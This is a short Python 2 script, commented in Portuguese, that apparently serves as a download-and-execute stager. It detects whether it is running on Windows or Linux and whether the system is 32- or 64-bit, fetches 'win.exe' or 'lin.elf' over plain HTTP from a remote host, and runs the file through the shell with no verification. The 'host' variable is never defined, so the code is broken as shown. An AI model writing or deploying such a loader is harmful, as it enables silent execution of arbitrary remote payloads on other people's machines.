from platform import platform, architecture   # Importa a função para obter o OS e arquitetura
from urllib import urlretrieve  # Importa a função para fazer download de arquivos
from subprocess import call     # Importa a função para chamar comandos no shell
def obterArch():
    global arch
    if architecture()[0] == '64bit':
        arch = 'x64'
    else:
        arch = 'x86'

def obterOS():  # Função para definir o OS
    if platform()[0] == 'W':
        return True
    else:
        return False

def init(): # Função para fazer o download do arquivo e chamar no shell
    urlF = 'http://%s/%s/%s' % (host, arch, url)
    urlretrieve(urlF, url)
    if obterOS() == True:
        call('call ' + url, shell=True)
    else:
        call('chmod +x ' + url, shell=True)
        call('./' + url, shell=True)

def main(): # Função Principal, define variavéis
    global url
    obterArch()
    if obterOS() == True:
        url = 'win.exe'
    else:
        url = 'lin.elf'
    init()

if __name__ == "__main__": # Inicia o Script
    main()
